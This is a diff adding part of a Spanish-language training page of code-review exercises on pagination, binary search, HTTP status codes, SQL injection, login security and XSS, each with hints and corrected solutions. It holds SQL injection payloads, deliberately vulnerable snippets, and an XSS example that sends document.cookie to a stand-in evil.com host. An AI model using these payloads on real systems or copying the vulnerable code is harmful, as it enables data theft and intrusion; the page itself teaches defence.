+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">def</span> <span class="fn">paginar</span>(items, pagina, por_pagina=<span class="num">10</span>):
+    <span class="kw">if</span> pagina &lt; <span class="num">0</span> <span class="kw">or</span> por_pagina &lt; <span class="num">1</span>:
+        <span class="kw">raise</span> ValueError(<span class="str">"Página y por_pagina deben ser positivos"</span>)
+    inicio = pagina * por_pagina
+    fin = inicio + por_pagina  <span class="cmt"># sin -1, el slice es exclusivo</span>
+    <span class="kw">return</span> items[inicio:fin]</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code>items = <span class="fn">list</span>(<span class="fn">range</span>(<span class="num">25</span>))
+<span class="kw">assert</span> <span class="fn">len</span>(<span class="fn">paginar</span>(items, <span class="num">0</span>)) == <span class="num">10</span>  <span class="cmt"># [0..9]</span>
+<span class="kw">assert</span> <span class="fn">len</span>(<span class="fn">paginar</span>(items, <span class="num">1</span>)) == <span class="num">10</span>  <span class="cmt"># [10..19]</span>
+<span class="kw">assert</span> <span class="fn">len</span>(<span class="fn">paginar</span>(items, <span class="num">2</span>)) == <span class="num">5</span>   <span class="cmt"># [20..24]</span>
+<span class="kw">assert</span> <span class="fn">paginar</span>(items, <span class="num">0</span>)[<span class="num">0</span>] == <span class="num">0</span>
+<span class="kw">assert</span> <span class="fn">paginar</span>(items, <span class="num">1</span>)[<span class="num">0</span>] == <span class="num">10</span>  <span class="cmt"># sin gap ni overlap</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 3.3 -->
+<article class="exercise" data-ex="3.3">
+  <div class="ex-head">
+    <h4>Ejercicio 3.3 — Búsqueda binaria con loop infinito</h4>
+    <span class="badge">Algoritmos</span>
+    <span class="tag py">PY</span>
+    <span class="diff d3">Dificil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Búsqueda binaria que se cuelga indefinidamente cuando el elemento no está en el array.</p>
+<pre><code><span class="kw">def</span> <span class="fn">busqueda_binaria</span>(arr, target):
+    izq, der = <span class="num">0</span>, <span class="fn">len</span>(arr) - <span class="num">1</span>
+    <span class="kw">while</span> izq &lt;= der:
+        medio = (izq + der) // <span class="num">2</span>
+        <span class="kw">if</span> arr[medio] == target:
+            <span class="kw">return</span> medio
+        <span class="kw">elif</span> arr[medio] &lt; target:
+            izq = medio  <span class="cmt"># BUG aquí</span>
+        <span class="kw">else</span>:
+            der = medio - <span class="num">1</span>
+    <span class="kw">return</span> -<span class="num">1</span></code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Cuando <code>izq=3, der=4</code>, <code>medio=3</code>. Si <code>arr[3] &lt; target</code>, se asigna <code>izq = medio = 3</code>. ¿Cambió algo? ¿Se reduce el rango? ¿Qué pasa en la siguiente iteración?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Traza con 2 elementos donde el target no esta y mira si <code>izq</code> cambia. Preguntate: el intervalo se achica en TODAS las ramas?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> <code>izq = medio</code> en vez de <code>izq = medio + 1</code>. Cuando el rango se reduce a 2 elementos y el target es mayor que el del medio, <code>izq</code> no avanza y el loop se repite infinitamente.</p>
+    <p><strong>2. ¿Por qué falla?</strong> Si <code>izq=3, der=4</code>, entonces <code>medio = (3+4)//2 = 3</code>. Si <code>arr[3] &lt; target</code>, asignamos <code>izq = 3</code> (sin cambio). La siguiente iteración calcula el mismo <code>medio=3</code> y entra en loop infinito.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Cuando el target no está en el array y la búsqueda converge a un rango de 2 elementos donde el target sería mayor que el elemento central.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">def</span> <span class="fn">busqueda_binaria</span>(arr, target):
+    izq, der = <span class="num">0</span>, <span class="fn">len</span>(arr) - <span class="num">1</span>
+    <span class="kw">while</span> izq &lt;= der:
+        medio = (izq + der) // <span class="num">2</span>
+        <span class="kw">if</span> arr[medio] == target:
+            <span class="kw">return</span> medio
+        <span class="kw">elif</span> arr[medio] &lt; target:
+            izq = medio + <span class="num">1</span>  <span class="cmt"># +1 para garantizar progreso</span>
+        <span class="kw">else</span>:
+            der = medio - <span class="num">1</span>
+    <span class="kw">return</span> -<span class="num">1</span></code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code>arr = [<span class="num">1</span>, <span class="num">3</span>, <span class="num">5</span>, <span class="num">7</span>, <span class="num">9</span>, <span class="num">11</span>]
+<span class="kw">assert</span> <span class="fn">busqueda_binaria</span>(arr, <span class="num">7</span>) == <span class="num">3</span>
+<span class="kw">assert</span> <span class="fn">busqueda_binaria</span>(arr, <span class="num">1</span>) == <span class="num">0</span>
+<span class="kw">assert</span> <span class="fn">busqueda_binaria</span>(arr, <span class="num">11</span>) == <span class="num">5</span>
+<span class="kw">assert</span> <span class="fn">busqueda_binaria</span>(arr, <span class="num">6</span>) == -<span class="num">1</span>   <span class="cmt"># no existe, no cuelga</span>
+<span class="kw">assert</span> <span class="fn">busqueda_binaria</span>([], <span class="num">1</span>) == -<span class="num">1</span>   <span class="cmt"># vacío</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+</section>
+
+<!-- ===================== MÓDULO 4 ===================== -->
+<section id="m4">
+<h2>🔐 Módulo 4 — APIs, HTTP y seguridad</h2>
+
+<h3>Teoría esencial</h3>
+<h4>Status codes mal usados</h4>
+<table>
+  <tr><th>Code</th><th>Uso correcto</th><th>Mal uso común</th></tr>
+  <tr><td>200</td><td>Éxito genérico</td><td>Devolver 200 con error en el body</td></tr>
+  <tr><td>400</td><td>Error del cliente (validación)</td><td>Usarlo para errores de servidor</td></tr>
+  <tr><td>401</td><td>No autenticado</td><td>Confundir con 403</td></tr>
+  <tr><td>403</td><td>Autenticado pero sin permiso</td><td>Usarlo en vez de 404 (info leakage)</td></tr>
+  <tr><td>404</td><td>Recurso no encontrado</td><td>No devolverlo cuando un ID no existe</td></tr>
+  <tr><td>500</td><td>Error interno del servidor</td><td>Exponer stack traces al cliente</td></tr>
+</table>
+
+<h4>Los 5 pecados de seguridad</h4>
+<div class="box danger">
+  <span class="box-title">🚫 Pecados capitales de seguridad</span>
+  <ol>
+    <li><strong>API keys hardcoded</strong> — en el código fuente o en logs.</li>
+    <li><strong>SQL injection</strong> — f-strings o concatenación en queries.</li>
+    <li><strong>Secrets en logs</strong> — passwords, tokens, PII en stdout.</li>
+    <li><strong>Sin validación de input</strong> — confiar en lo que envía el cliente.</li>
+    <li><strong>Errores que revelan internals</strong> — stack traces, nombres de tablas, queries SQL.</li>
+  </ol>
+</div>
+
+<div class="theory">
+  <h4>📚 Teoría M4 — HTTP correcto y seguridad sin perdón (léeme antes de los ejercicios)</h4>
+  <p>En el examen de reviewer la seguridad <strong>no es opinable</strong>: un SQLi o un secret en logs es severidad crítica aunque "funcione". Y un status mal usado es bug funcional: el cliente automatizado decide por el código, no por el body.</p>
+  <h5>1. Status codes: el contrato que el cliente sí lee</h5>
+  <ul>
+    <li><code>400</code> input inválido · <code>401</code> falta auth · <code>403</code> auth ok pero sin permiso · <code>404</code> no existe · <code>409</code> conflicto (duplicado) · <code>429</code> rate limit · <code>500</code> fallo nuestro.</li>
+    <li>Nunca devuelvas <code>200</code> con <code>{"error": ...}</code>: rompes reintentos, cachés y alertas. Nunca devuelvas <code>500</code> con stack trace: regalas internals al atacante.</li>
+    <li><code>404</code> vs <code>403</code>: si el recurso no existe para ese usuario, <code>404</code> (no confirmes que existe). El <code>403</code> confirma existencia.</li>
+  </ul>
+  <h5>2. SQL injection: parámetros siempre, f-strings nunca</h5>
+  <ul>
+    <li><code>f"SELECT ... WHERE id = '{id}'"</code> es inyectable con <code>' OR '1'='1</code>. La corrección es <strong>query parametrizada</strong>: <code>WHERE id = $1</code> + pasar <code>id</code> aparte.</li>
+    <li>Trampa: <code>ORDER BY {col}</code> y <code>LIKE '%{q}%'</code> <strong>no se pueden parametrizar</strong> como valores. Solución: allowlist de columnas (<code>if col not in {"nombre","precio"}: 400</code>) y escapar <code>%_</code> en LIKE.</li>
+  </ul>
+  <h5>3. Auth: hash, timing y enumeración</h5>
+  <ul>
+    <li>Passwords: <strong>bcrypt/argon2</strong>, nunca plaintext ni SHA256 pelado. Comparar hashes con <strong>comparación constante</strong> (<code>hmac.compare_digest</code>), nunca <code>==</code>.</li>
+    <li>Login: el error debe ser genérico ("credenciales inválidas") y tardar lo mismo exista o no el usuario. Decir "usuario no existe" = <strong>enumeración de usuarios</strong>.</li>
+    <li>Secrets (API keys, tokens, PII) <strong>jamás</strong> en código, logs ni respuestas de error. Van en variables de entorno.</li>
+  </ul>
+</div>
+
+<ul class="goals">
+  <li>Asignas el status correcto (400/401/403/404/409/500) sin dudar.</li>
+  <li>Distingues query parametrizable de identificador dinámico (allowlist).</li>
+  <li>Detectas plaintext, ==, enumeración y secrets en logs al instante.</li>
+</ul>
+
+<h3>Ejemplo resuelto 0.3 — API key hardcoded</h3>
+<pre><code>STRIPE_KEY = <span class="str">"sk_live_abc123..."</span>  <span class="cmt"># en el código fuente</span>
+<span class="fn">print</span>(<span class="str">f"Usando key: {STRIPE_KEY}"</span>)  <span class="cmt"># en los logs</span></code></pre>
+
+<!-- Ejercicio 4.1 -->
+<article class="exercise" data-ex="4.1">
+  <div class="ex-head">
+    <h4>Ejercicio 4.1 — Endpoint FastAPI sin 404 y filtrando con str(e)</h4>
+    <span class="badge">APIs + Seguridad</span>
+    <span class="tag py">PY</span>
+    <span class="tag http">HTTP</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Endpoint que busca un producto por ID. No devuelve 404 cuando no existe y expone detalles internos en el error.</p>
+<pre><code><span class="kw">@app.get</span>(<span class="str">"/productos/{id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_producto</span>(id: <span class="fn">str</span>):
+    <span class="kw">try</span>:
+        producto = db.<span class="fn">query</span>(<span class="str">f"SELECT * FROM productos WHERE id = '{id}'"</span>)
+        <span class="kw">return</span> producto
+    <span class="kw">except</span> Exception <span class="kw">as</span> e:
+        <span class="kw">return</span> {<span class="str">"error"</span>: <span class="fn">str</span>(e), <span class="str">"query"</span>: <span class="str">f"SELECT * FROM productos WHERE id = '{id}'"</span>}</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Cuatro problemas: (1) ¿Qué pasa si el producto no existe? ¿Devuelve 404? (2) ¿Cómo se construye la query? (3) ¿Qué se expone en el error? (4) ¿Qué status code se devuelve cuando hay excepción?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Hay 4 hallazgos: status si no existe, f-string en SQL, <code>str(e)</code> en la respuesta y status del error. Busca uno de cada familia.</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Cuatro bugs: no devuelve 404 si el producto no existe (devuelve null/200), SQL injection por f-string en la query, expone la query SQL completa y el mensaje de error interno al cliente, y no usa HTTPException.</p>
+    <p><strong>2. ¿Por qué falla?</strong> El f-string <code>f"...WHERE id = '{id}'"</code> permite inyección SQL. <code>str(e)</code> puede contener nombres de tablas, columnas y detalles de la BD. Sin <code>HTTPException(404)</code>, el cliente no puede distinguir "no existe" de "error".</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> SQL injection: siempre que un atacante envíe <code>id = "' OR '1'='1"</code>. Info leakage: en cualquier error de BD. Sin 404: cuando el ID no existe.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">from</span> fastapi <span class="kw">import</span> HTTPException
+
+<span class="kw">@app.get</span>(<span class="str">"/productos/{id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_producto</span>(id: <span class="fn">str</span>):
+    <span class="kw">try</span>:
+        producto = <span class="kw">await</span> db.<span class="fn">fetch_one</span>(
+            <span class="str">"SELECT * FROM productos WHERE id = :id"</span>,
+            {<span class="str">"id"</span>: id}
+        )
+    <span class="kw">except</span> Exception:
+        <span class="kw">raise</span> HTTPException(status_code=<span class="num">500</span>, detail=<span class="str">"Error interno"</span>)
+    <span class="kw">if</span> producto <span class="kw">is None</span>:
+        <span class="kw">raise</span> HTTPException(status_code=<span class="num">404</span>, detail=<span class="str">"Producto no encontrado"</span>)
+    <span class="kw">return</span> producto</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt"># Test: ID inexistente devuelve 404</span>
+response = client.get(<span class="str">"/productos/no-existe"</span>)
+<span class="kw">assert</span> response.status_code == <span class="num">404</span>
+
+<span class="cmt"># Test: SQL injection no funciona</span>
+response = client.get(<span class="str">"/productos/' OR '1'='1"</span>)
+<span class="kw">assert</span> response.status_code <span class="kw">in</span> (<span class="num">404</span>, <span class="num">422</span>)
+
+<span class="cmt"># Test: el error no expone internals</span>
+<span class="kw">assert</span> <span class="str">"SELECT"</span> <span class="kw">not in</span> response.text</code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 4.2 -->
+<article class="exercise" data-ex="4.2">
+  <div class="ex-head">
+    <h4>Ejercicio 4.2 — SQL injection en LIKE, categoría y ORDER BY</h4>
+    <span class="badge">Seguridad</span>
+    <span class="tag py">PY</span>
+    <span class="diff d3">Dificil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Endpoint de búsqueda de productos con filtros. Tres vectores de SQL injection.</p>
+<pre><code><span class="kw">@app.get</span>(<span class="str">"/buscar"</span>)
+<span class="kw">async def</span> <span class="fn">buscar</span>(q: <span class="fn">str</span>, categoria: <span class="fn">str</span> = <span class="kw">None</span>, orden: <span class="fn">str</span> = <span class="str">"precio"</span>):
+    query = <span class="str">f"SELECT * FROM productos WHERE nombre LIKE '%{q}%'"</span>
+    <span class="kw">if</span> categoria:
+        query += <span class="str">f" AND categoria = '{categoria}'"</span>
+    query += <span class="str">f" ORDER BY {orden}"</span>
+    <span class="kw">return</span> db.<span class="fn">execute</span>(query)</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Tres parámetros del usuario se interpolan directamente en SQL. El parámetro <code>orden</code> es especialmente peligroso porque ORDER BY no acepta parámetros vinculados en la mayoría de ORMs. ¿Cómo whitelistar columnas válidas?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Hay 3 inyecciones: <code>LIKE</code>, categoria y <code>ORDER BY</code>. Preguntate: cuales aceptan parametros y cual exige allowlist?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Tres vectores de SQL injection: <code>q</code> en LIKE, <code>categoria</code> en WHERE, y <code>orden</code> en ORDER BY. Todos interpolados con f-strings directamente en la query.</p>
+    <p><strong>2. ¿Por qué falla?</strong> Los f-strings no escapan caracteres especiales de SQL. Un atacante puede cerrar comillas e inyectar SQL arbitrario. <code>ORDER BY</code> no se puede parametrizar con <code>$1</code> en la mayoría de drivers, por lo que requiere whitelist.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Siempre que un atacante envíe payloads como <code>q = "' UNION SELECT * FROM usuarios --"</code> o <code>orden = "precio; DROP TABLE productos"</code>.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code>COLUMNAS_VALIDAS = {<span class="str">"precio"</span>, <span class="str">"nombre"</span>, <span class="str">"created_at"</span>}
+
+<span class="kw">@app.get</span>(<span class="str">"/buscar"</span>)
+<span class="kw">async def</span> <span class="fn">buscar</span>(q: <span class="fn">str</span>, categoria: <span class="fn">str</span> = <span class="kw">None</span>, orden: <span class="fn">str</span> = <span class="str">"precio"</span>):
+    <span class="kw">if</span> orden <span class="kw">not in</span> COLUMNAS_VALIDAS:
+        <span class="kw">raise</span> HTTPException(<span class="num">400</span>, <span class="str">"Orden inválido"</span>)
+    query = <span class="str">"SELECT * FROM productos WHERE nombre LIKE :q"</span>
+    params = {<span class="str">"q"</span>: <span class="str">f"%{q}%"</span>}
+    <span class="kw">if</span> categoria:
+        query += <span class="str">" AND categoria = :cat"</span>
+        params[<span class="str">"cat"</span>] = categoria
+    query += <span class="str">f" ORDER BY {orden}"</span>  <span class="cmt"># seguro porque está whitelisted</span>
+    <span class="kw">return await</span> db.<span class="fn">execute</span>(query, params)</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt"># SQL injection en q no funciona</span>
+r = client.get(<span class="str">"/buscar?q=' UNION SELECT * FROM usuarios--"</span>)
+<span class="kw">assert</span> r.status_code == <span class="num">200</span>
+<span class="kw">assert</span> <span class="fn">len</span>(r.json()) == <span class="num">0</span>  <span class="cmt"># no devuelve datos de usuarios</span>
+
+<span class="cmt"># Orden inválido se rechaza</span>
+r = client.get(<span class="str">"/buscar?q=test&amp;orden=precio; DROP TABLE"</span>)
+<span class="kw">assert</span> r.status_code == <span class="num">400</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 4.3 -->
+<article class="exercise" data-ex="4.3">
+  <div class="ex-head">
+    <h4>Ejercicio 4.3 — Login con password en logs, == para comparar, user enumeration</h4>
+    <span class="badge">Seguridad + Auth</span>
+    <span class="tag py">PY</span>
+    <span class="diff d3">Dificil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Endpoint de login con tres problemas de seguridad graves.</p>
+<pre><code><span class="kw">@app.post</span>(<span class="str">"/login"</span>)
+<span class="kw">async def</span> <span class="fn">login</span>(email: <span class="fn">str</span>, password: <span class="fn">str</span>):
+    logger.<span class="fn">info</span>(<span class="str">f"Login intento: {email} pass={password}"</span>)
+    user = db.<span class="fn">query</span>(<span class="str">"SELECT * FROM users WHERE email = :e"</span>, {<span class="str">"e"</span>: email})
+    <span class="kw">if not</span> user:
+        <span class="kw">return</span> {<span class="str">"error"</span>: <span class="str">"Email no registrado"</span>}
+    <span class="kw">if</span> user.password == password:
+        <span class="kw">return</span> {<span class="str">"token"</span>: <span class="fn">generar_token</span>(user)}
+    <span class="kw">return</span> {<span class="str">"error"</span>: <span class="str">"Password incorrecto"</span>}</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Tres problemas: (1) ¿Qué se guarda en los logs? (2) ¿Cómo se compara la password? ¿Está hasheada en la BD? (3) ¿Los mensajes de error son diferentes para "email no existe" vs "password incorrecta"? ¿Qué permite eso?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Hay 3 hallazgos: password en logs, <code>==</code> vs hash y mensajes distintos. Preguntate: que aprende un atacante de cada respuesta?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Tres bugs de seguridad: password en texto plano en logs, comparación directa de password (sin hash), y mensajes de error diferentes que permiten enumeración de usuarios.</p>
+    <p><strong>2. ¿Por qué falla?</strong> (1) Los logs se almacenan, se comparten, se envían a servicios externos — la password queda expuesta. (2) Si la BD tiene passwords hasheadas (bcrypt), <code>==</code> nunca matchea. Si tiene passwords en texto plano, es una violación masiva en caso de breach. (3) "Email no registrado" vs "Password incorrecto" permite a un atacante saber qué emails existen en el sistema.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> (1) Inmediatamente: cada login escribe la password en logs. (2) Siempre si la BD tiene hashes. (3) Cualquier atacante puede enumerar emails válidos.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">import</span> bcrypt
+
+<span class="kw">@app.post</span>(<span class="str">"/login"</span>)
+<span class="kw">async def</span> <span class="fn">login</span>(email: <span class="fn">str</span>, password: <span class="fn">str</span>):
+    logger.<span class="fn">info</span>(<span class="str">f"Login intento: {email}"</span>)  <span class="cmt"># sin password</span>
+    user = <span class="kw">await</span> db.<span class="fn">fetch_one</span>(
+        <span class="str">"SELECT * FROM users WHERE email = :e"</span>, {<span class="str">"e"</span>: email}
+    )
+    <span class="cmt"># Mensaje genérico para no enumerar usuarios</span>
+    <span class="kw">if not</span> user <span class="kw">or not</span> bcrypt.<span class="fn">checkpw</span>(password.<span class="fn">encode</span>(), user.password_hash.<span class="fn">encode</span>()):
+        <span class="kw">raise</span> HTTPException(<span class="num">401</span>, <span class="str">"Credenciales inválidas"</span>)
+    <span class="kw">return</span> {<span class="str">"token"</span>: <span class="fn">generar_token</span>(user)}</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt"># Email no existente y password incorrecta dan el mismo error</span>
+r1 = client.post(<span class="str">"/login"</span>, json={<span class="str">"email"</span>: <span class="str">"no@existe.com"</span>, <span class="str">"password"</span>: <span class="str">"x"</span>})
+r2 = client.post(<span class="str">"/login"</span>, json={<span class="str">"email"</span>: <span class="str">"si@existe.com"</span>, <span class="str">"password"</span>: <span class="str">"mal"</span>})
+<span class="kw">assert</span> r1.status_code == r2.status_code == <span class="num">401</span>
+<span class="kw">assert</span> r1.json()[<span class="str">"detail"</span>] == r2.json()[<span class="str">"detail"</span>]
+
+<span class="cmt"># Password NO aparece en logs</span>
+<span class="cmt"># Verificar manualmente en el output del logger</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+</section>
+
+<!-- ===================== MÓDULO 5 ===================== -->
+<section id="m5">
+<h2>🖥️ Módulo 5 — Frontend y full-stack</h2>
+
+<h3>Teoría esencial</h3>
+<h4>XSS con innerHTML</h4>
+<p><code>innerHTML</code> interpreta HTML. Si inyectas contenido del usuario sin sanitizar, un atacante puede ejecutar JavaScript arbitrario: <code>&lt;img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)"&gt;</code></p>
+
+<h4>3 bugs de fetch en cliente</h4>
+<div class="box warn">
+  <span class="box-title">⚠️ Fetch en el navegador</span>
+  <ol>
+    <li>No rechaza por status HTTP (igual que Node).</li>
+    <li>Sin AbortController, no se puede cancelar al desmontar el componente.</li>
+    <li>Sin manejo de red offline, el usuario ve un spinner infinito.</li>
+  </ol>
+</div>
+
+<h4>Race conditions en UI</h4>
+<p>Cuando el usuario hace doble click en "Pagar", se envían dos requests. Sin idempotency key ni bloqueo del botón, se cobra dos veces. Lo mismo con polling: si la respuesta tarda más que el intervalo, se acumulan requests concurrentes.</p>
+
+<div class="theory">
+  <h4>📚 Teoría M5 — Frontend que no cobra dos veces ni ejecuta XSS (léeme antes de los ejercicios)</h4>
+  <p>En frontend el examen persigue 3 familias: <strong>XSS por innerHTML</strong>, <strong>doble submit</strong> y <strong>polling con reentrada</strong>. Las tres comparten raíz: confiar en que "el usuario hará click una vez" o "el input es texto inocente". Nunca lo es.</p>
+  <h5>1. XSS: innerHTML es un sink, trátalo como tal</h5>
+  <ul>
+    <li><code>el.innerHTML = ...usuario...</code> ejecuta HTML/JS. Vectores del examen: el query <code>q</code>, el título renderizado y el <code>href</code> con <code>javascript:</code>.</li>
+    <li>Corrección por capas: <code>textContent</code> para texto (no interpreta HTML), allowlist de URLs (<code>http/https</code>, bloquea <code>javascript:</code>), y sanitizar/escapar (<code>&lt; &gt; &amp; " '</code>) lo que venga de fuera.</li>
+    <li>En React el equivalente es <code>dangerouslySetInnerHTML</code>: si lo ves sin sanitizar, es hallazgo directo.</li>
+  </ul>
+  <h5>2. Doble submit: botón + idempotencia</h5>
+  <ul>
+    <li>Doble click = dos POST = dos cobros. Defensa en cliente: flag <code>processing</code> + <code>disabled</code> + <code>finally</code> que libera. Defensa real: <strong>Idempotency-Key</strong> que el servidor guarda (UNIQUE) antes de cobrar.</li>
+    <li>Sin el header, el fix de UI es cosmético: un reintento de red legítimo seguiría cobrando doble. El examen quiere las <strong>dos capas</strong>.</li>
+  </ul>
+  <h5>3. Polling: setInterval miente cuando hay latencia</h5>
+  <ul>
+    <li><code>setInterval(poll, 2000)</code> dispara aunque el poll anterior siga vivo → reentrada, respuestas fuera de orden, thundering herd.</li>
+    <li>Patrón: <code>setTimeout</code> recursivo (agenda el siguiente <strong>después</strong> de terminar) + flag <code>inFlight</code> + dedupe por id + <strong>backoff exponencial</strong> con jitter ante errores.</li>
+  </ul>
+</div>
+
+<ul class="goals">
+  <li>Enumeras los 3 vectores XSS de un buscador y su fix por capas.</li>
+  <li>Exiges botón bloqueado + Idempotency-Key en cualquier cobro.</li>
+  <li>Sustituyes setInterval por setTimeout recursivo con backoff.</li>
+</ul>
+
+<h3>Ejemplo resuelto 0.4 — innerHTML con comentarios</h3>
+<pre><code><span class="cmt">// El usuario escribe un "comentario"</span>
+div.innerHTML = <span class="str">`&lt;p&gt;${comentario}&lt;/p&gt;`</span>;
+<span class="cmt">// Si comentario = '&lt;script&gt;document.location="https://evil.com"&lt;/script&gt;'</span>
+<span class="cmt">// =&gt; XSS ejecutado</span></code></pre>
+
+<!-- Ejercicio 5.1 -->
+<article class="exercise" data-ex="5.1">
+  <div class="ex-head">
+    <h4>Ejercicio 5.1 — Buscador con XSS en 3 vectores</h4>
+    <span class="badge">XSS</span>
+    <span class="tag ui">UI</span>
+    <span class="tag js">JS</span>
+    <span class="diff d3">Dificil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Buscador que renderiza resultados. Tres vectores de XSS.</p>
+<pre><code><span class="kw">function</span> <span class="fn">renderResultados</span>(query, resultados) {
+  <span class="kw">let</span> html = <span class="str">`&lt;h2&gt;Resultados para: ${query}&lt;/h2&gt;&lt;ul&gt;`</span>;
+  resultados.<span class="fn">forEach</span>(r =&gt; {
+    html += <span class="str">`&lt;li&gt;&lt;a href="${r.url}"&gt;${r.titulo}&lt;/a&gt;&lt;/li&gt;`</span>;
+  });
+  html += <span class="str">"&lt;/ul&gt;"</span>;
+  document.getElementById(<span class="str">"results"</span>).innerHTML = html;
+}</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Tres variables del usuario se inyectan en HTML sin escapar: (1) <code>query</code> en el título, (2) <code>r.titulo</code> en el texto del link, (3) <code>r.url</code> en el href. ¿Qué pasa si url es <code>javascript:alert(1)</code>?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Hay 3 vectores: <code>q</code>, titulo y <code>href</code>. Preguntate: cual ejecuta JS directo y cual navega a <code>javascript:</code>?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Tres vectores XSS: <code>query</code> se inyecta en el HTML del título, <code>r.titulo</code> en el texto del enlace, y <code>r.url</code> puede ser <code>javascript:...</code> en el href.</p>
+    <p><strong>2. ¿Por qué falla?</strong> <code>innerHTML</code> interpreta HTML. Si <code>query = "&lt;img src=x onerror=alert(1)&gt;"</code>, se ejecuta JavaScript. Si <code>r.url = "javascript:alert(document.cookie)"</code>, al hacer click se ejecuta el payload.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Cuando un atacante controla los datos de búsqueda (XSS reflejado) o cuando los resultados incluyen contenido generado por otros usuarios (XSS almacenado).</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">function</span> <span class="fn">escapeHtml</span>(str) {
+  <span class="kw">const</span> div = document.<span class="fn">createElement</span>(<span class="str">"div"</span>);
+  div.textContent = str;
+  <span class="kw">return</span> div.innerHTML;
+}
+
+<span class="kw">function</span> <span class="fn">esUrlSegura</span>(url) {
+  <span class="kw">try</span> {
+    <span class="kw">const</span> u = <span class="kw">new</span> URL(url, location.origin);
+    <span class="kw">return</span> [<span class="str">"http:"</span>, <span class="str">"https:"</span>].<span class="fn">includes</span>(u.protocol);
+  } <span class="kw">catch</span> { <span class="kw">return</span> <span class="kw">false</span>; }
+}
+
+<span class="kw">function</span> <span class="fn">renderResultados</span>(query, resultados) {
+  <span class="kw">const</span> container = document.<span class="fn">createElement</span>(<span class="str">"div"</span>);
+  <span class="kw">const</span> h2 = document.<span class="fn">createElement</span>(<span class="str">"h2"</span>);
+  h2.textContent = <span class="str">`Resultados para: ${query}`</span>;
+  container.<span class="fn">appendChild</span>(h2);
+  <span class="kw">const</span> ul = document.<span class="fn">createElement</span>(<span class="str">"ul"</span>);
+  resultados.<span class="fn">forEach</span>(r =&gt; {
+    <span class="kw">const</span> li = document.<span class="fn">createElement</span>(<span class="str">"li"</span>);
+    <span class="kw">const</span> a = document.<span class="fn">createElement</span>(<span class="str">"a"</span>);
+    a.textContent = r.titulo;
+    a.href = <span class="fn">esUrlSegura</span>(r.url) ? r.url : <span class="str">"#"</span>;
+    li.<span class="fn">appendChild</span>(a);
+    ul.<span class="fn">appendChild</span>(li);
+  });
+  container.<span class="fn">appendChild</span>(ul);
+  document.getElementById(<span class="str">"results"</span>).<span class="fn">replaceChildren</span>(container);
+}</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt">// XSS en query no se ejecuta</span>
+<span class="fn">renderResultados</span>(<span class="str">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>, []);
+<span class="cmt">// El script aparece como texto, no se ejecuta</span>
+
+<span class="cmt">// javascript: URL se bloquea</span>
+<span class="fn">renderResultados</span>(<span class="str">"test"</span>, [{titulo:<span class="str">"click"</span>, url:<span class="str">"javascript:alert(1)"</span>}]);
